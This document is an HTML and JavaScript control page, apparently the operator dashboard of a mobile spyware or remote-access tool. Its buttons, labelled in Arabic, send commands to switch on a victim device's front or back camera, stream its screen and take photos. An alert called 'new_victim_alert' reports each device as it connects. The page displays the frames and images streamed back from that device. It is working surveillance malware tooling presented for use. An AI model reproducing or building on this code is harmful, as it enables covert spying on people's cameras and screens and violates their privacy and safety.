<!DOCTYPE html>
<html>
<head>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; text-align: center; }
        #monitor { width: 100vw; height: calc(100vh - 150px); background: #050505; display: flex; align-items: center; justify-content: center; position: relative; }
        #liveImg { max-height: 100%; max-width: 100%; border: 1px solid #333; }
        .status-bar { position: absolute; top: 10px; background: rgba(0,0,0,0.8); padding: 5px 20px; border: 1px solid #0f0; }
        .controls { height: 150px; background: #111; border-top: 2px solid #0f0; display: flex; flex-wrap: wrap; justify-content: center; align-items: center; gap: 10px; padding: 10px; }
        button { background: #0f0; color: #000; padding: 12px 18px; border: none; font-weight: bold; cursor: pointer; border-radius: 4px; }
        button:hover { background: #fff; }
    </style>
</head>
<body>
    <div id="monitor">
        <div class="status-bar" id="status">🟢 Waiting for connection...</div>
        <img id="liveImg" src="">
    </div>
    
    <div class="controls">
        <button onclick="send('start_camera_back')">📸 خلفية</button>
        <button onclick="send('start_camera_front')">🤳 أمامية</button>
        <button onclick="send('start_screen')">📱 شاشة</button>
        <button onclick="send('take_photo')">🖼️ صورة</button>
        <button onclick="send('stop_all')" style="background: red; color: white;">🛑 إيقاف</button>
        <button onclick="location.reload()">🔄 تحديث</button>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const img = document.getElementById('liveImg');
        const stat = document.getElementById('status');

        // تحديث الحالة عند وصول تبليغ
        socket.on('new_victim_alert', d => {
            stat.innerText = "🔥 ONLINE: " + d.model;
            stat.style.color = "#0f0";
        });

        socket.on('display_frame', d => {
            img.src = "data:image/jpeg;base64," + d.frame;
        });

        socket.on('display_photo', d => {
            img.src = "data:image/jpeg;base64," + d.img;
            alert("Photo received!");
        });

        function send(cmd) { socket.emit('admin_command', { command: cmd }); }
    </script>
</body>
</html>
